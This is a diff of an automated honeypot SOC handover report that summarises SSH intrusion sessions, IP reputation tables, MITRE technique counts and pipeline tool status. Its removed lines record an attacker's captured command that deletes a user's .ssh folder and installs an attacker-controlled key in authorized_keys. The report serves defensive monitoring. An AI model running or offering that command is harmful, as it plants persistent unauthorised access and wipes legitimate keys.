-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:41:57` | `cowrie.session.connect` |
-| `2026-05-16 06:41:57` | `cowrie.client.version` |
-| `2026-05-16 06:41:57` | `cowrie.client.kex` |
-| `2026-05-16 06:41:57` | `cowrie.login.success` |
-| `2026-05-16 06:41:57` | `cowrie.session.params` |
-| `2026-05-16 06:41:57` | `cowrie.command.input` |
-| `2026-05-16 06:41:57` | `cowrie.command.failed` |
-| `2026-05-16 06:41:57` | `cowrie.log.closed` |
-| `2026-05-16 06:41:57` | `cowrie.session.params` |
-| `2026-05-16 06:41:57` | `cowrie.command.input` |
-| `2026-05-16 06:41:57` | `cowrie.session.file_download` |
-| `2026-05-16 06:41:57` | `cowrie.log.closed` |
-| `2026-05-16 06:41:59` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-fdb2cd89fb6b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:41 |
-| **Last Seen** | 2026-05-16 06:41 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:41:59` | `cowrie.session.connect` |
-| `2026-05-16 06:41:59` | `cowrie.client.version` |
-| `2026-05-16 06:41:59` | `cowrie.client.kex` |
-| `2026-05-16 06:41:59` | `cowrie.login.success` |
-| `2026-05-16 06:41:59` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-17c8fa5ea9ab
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:46 |
-| **Last Seen** | 2026-05-16 06:46 |
-| **Session Duration** | 2s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:46:02` | `cowrie.session.connect` |
-| `2026-05-16 06:46:02` | `cowrie.client.version` |
-| `2026-05-16 06:46:02` | `cowrie.client.kex` |
-| `2026-05-16 06:46:02` | `cowrie.login.success` |
-| `2026-05-16 06:46:03` | `cowrie.session.params` |
-| `2026-05-16 06:46:03` | `cowrie.command.input` |
-| `2026-05-16 06:46:03` | `cowrie.command.failed` |
-| `2026-05-16 06:46:03` | `cowrie.log.closed` |
-| `2026-05-16 06:46:03` | `cowrie.session.params` |
-| `2026-05-16 06:46:03` | `cowrie.command.input` |
-| `2026-05-16 06:46:03` | `cowrie.session.file_download` |
-| `2026-05-16 06:46:03` | `cowrie.log.closed` |
-| `2026-05-16 06:46:04` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-c84451761ddf
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `49.207.244[.]212` |
-| **First Seen** | 2026-05-16 06:46 |
-| **Last Seen** | 2026-05-16 06:46 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-05-16 06:46:04` | `cowrie.session.connect` |
-| `2026-05-16 06:46:04` | `cowrie.client.version` |
-| `2026-05-16 06:46:04` | `cowrie.client.kex` |
-| `2026-05-16 06:46:04` | `cowrie.login.success` |
-| `2026-05-16 06:46:04` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `49.207.244[.]212` to AbuseIPDB if not already reported
-- [ ] Block `49.207.244[.]212` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
+_No priority cases this shift. All confirmed sessions were credential scans only._
 
 ---
 
@@ -718,14 +108,11 @@ Source IPs: `49.207.244.212`
 
 | IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
 |---|---|---|---|---|---|---|---|
-| `107.182.234[.]69` | **338** | 2026-05-16 06:25 | 2026-05-16 09:43 | 247m | 0 | `T1592` | 🟠 MEDIUM |
-| `161.35.8[.]0` | **37** | 2026-05-16 06:37 | 2026-05-16 09:42 | 28m | 0 | `T1592` | 🟠 MEDIUM |
-| `45.148.120[.]187` | **35** | 2026-05-16 06:49 | 2026-05-16 09:40 | 38m | 0 | `T1592` | 🟠 MEDIUM |
-| `49.207.244[.]212` | **17** | 2026-05-16 06:25 | 2026-05-16 06:47 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
-| `190.216.132[.]206` | 1 | 2026-05-16 06:26 | 2026-05-16 06:26 | 3s | 0 | `T1592` | 🟢 LOW |
-| `64.227.108[.]146` | 1 | 2026-05-16 08:47 | 2026-05-16 08:47 | 2s | 0 | `T1592` | 🟢 LOW |
-| `66.132.224[.]235` | 1 | 2026-05-16 07:15 | 2026-05-16 07:15 | 15s | 0 | `T1592` | 🟢 LOW |
-| `79.34.194[.]187` | 1 | 2026-05-16 07:15 | 2026-05-16 07:17 | 120s | 0 | `T1592` | 🟢 LOW |
+| `107.182.234[.]69` | **156** | 2026-05-16 09:43 | 2026-05-16 11:04 | 113m | 0 | `T1592` | 🟠 MEDIUM |
+| `45.148.120[.]187` | **19** | 2026-05-16 09:43 | 2026-05-16 11:00 | 20m | 0 | `T1592` | 🟠 MEDIUM |
+| `161.35.8[.]0` | **18** | 2026-05-16 09:49 | 2026-05-16 11:01 | 15m | 0 | `T1592` | 🟠 MEDIUM |
+| `45.186.52[.]169` | **6** | 2026-05-16 09:55 | 2026-05-16 09:59 | 12m | 0 | `T1592` | 🟢 LOW |
+| `212.73.148[.]25` | 1 | 2026-05-16 09:46 | 2026-05-16 09:46 | 0s | 0 | `T1592` | 🟢 LOW |
 
 ---
 
@@ -769,15 +156,13 @@ Source IPs: `49.207.244.212`
 | IP | Country | ISP | Abuse Score | OTX Pulses |
 |---|---|---|---|---|
 | `107.182.234[.]69` | US | Hosting Services, Inc. | **100** ⚠️ | 1 |
-| `64.227.108[.]146` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
-| `79.34.194[.]187` | IT | Telecom Italia S.p.A. | **100** ⚠️ | 3 |
 | `161.35.8[.]0` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
-| `49.207.244[.]212` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 1 |
-| `66.132.224[.]235` | US | Censys, Inc. | **100** ⚠️ | 50 |
+| `45.186.52[.]169` | BR | G3LINK TELECOM SERVICO DE COMUNICACAO MULTIMIDIA | **100** ⚠️ | 2 |
+| `212.73.148[.]25` | SG | NL MODAT | **100** ⚠️ | 50 |
 | `45.148.120[.]187` | NL | SpectraIP B.V. | **100** ⚠️ | 0 |
-| `190.216.132[.]206` | CO | STAR TV NETWORK SAS | **98** ⚠️ | 4 |
-| `116.59.29[.]77` | TW | CHT-Mobile business Group,Chunghwa | **68** | 48 |
-| `196.115.193[.]203` | MA | 2G/3G/4G Mobile Costumers | **65** | 0 |
+| `125.119.237[.]173` | CN | CHINANET-ZJ Hangzhou node network | **56** | 0 |
+| `188.114.68[.]162` | PL | DTnet Adam Tarkowski Aneta Wyrwas s.c. | **38** | 6 |
+| `49.43.169[.]115` | IN | Reliance Jio Infocomm Limited | 3 | 0 |
 
 ---
 
@@ -785,23 +170,17 @@ Source IPs: `49.207.244.212`
 
 | TTP ID | Count |
 |---|---|
-| [T1592](https://attack.mitre.org/techniques/T1592) | 34 |
-| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
-| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
-| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
-| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
+| [T1592](https://attack.mitre.org/techniques/T1592) | 1 |
 
 ---
 
-## 🔕 False Positive Summary (10 filtered)
+## 🔕 False Positive Summary (8 filtered)
 
 | Reason | Count |
 |---|---|
-| AbuseIPDB score 0 below threshold 25 | 1 |
-| AbuseIPDB score 16 below threshold 25 | 1 |
-| AbuseIPDB score 4 below threshold 25 | 2 |
-| AbuseIPDB score 5 below threshold 25 | 2 |
-| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |
+| AbuseIPDB score 0 below threshold 25 | 5 |
+| AbuseIPDB score 3 below threshold 25 | 1 |
+| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |
 
 > FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.
 
@@ -812,19 +191,19 @@ Source IPs: `49.207.244.212`
 | Tool | Role | Status |
 |---|---|---|
 | Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
-| Tool 26  | Incident Timeline Generator | ✅ 457 cases |
-| Tool 34  | Credential Extractor        | ✅ 33 attempts |
-| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
-| Tool 36  | Command Clustering          | ✅ 1 clusters |
-| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
-| Tool 29  | False Positive Tracker      | ✅ 10 filtered (2.2%) |
+| Tool 26  | Incident Timeline Generator | ✅ 208 cases |
+| Tool 34  | Credential Extractor        | ✅ 0 attempts |
+| Tool 35  | SSH Fingerprint Aggregator  | ✅ 1 fingerprints |
+| Tool 36  | Command Clustering          | ✅ 0 clusters |
+| Tool 27  | Threat Intel Feeder         | ✅ 13 IPs enriched |
+| Tool 29  | False Positive Tracker      | ✅ 8 filtered (3.9%) |
 | Tool 30  | Metric Exporter             | ✅ stats.json written |
-| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
+| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
 | Tool 31  | Malware Analyzer            | ✅ 28 files |
 | Tool 33  | YARA Classifier             | ✅ 8 classified |
 | Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |
 
-> **Report grouping:** 16 priority case(s) shown individually · 8 recon entry/entries in table (4 group(s) consolidating 427 session(s)).
+> **Report grouping:** 0 priority case(s) shown individually · 5 recon entry/entries in table (4 group(s) consolidating 199 session(s)).
 
 ---
 
@@ -840,4 +219,4 @@ Source IPs: `49.207.244.212`
 
 _Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
 _Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
-_Report time: 2026-05-16T09:44:36Z_
+_Report time: 2026-05-16T11:04:42Z_
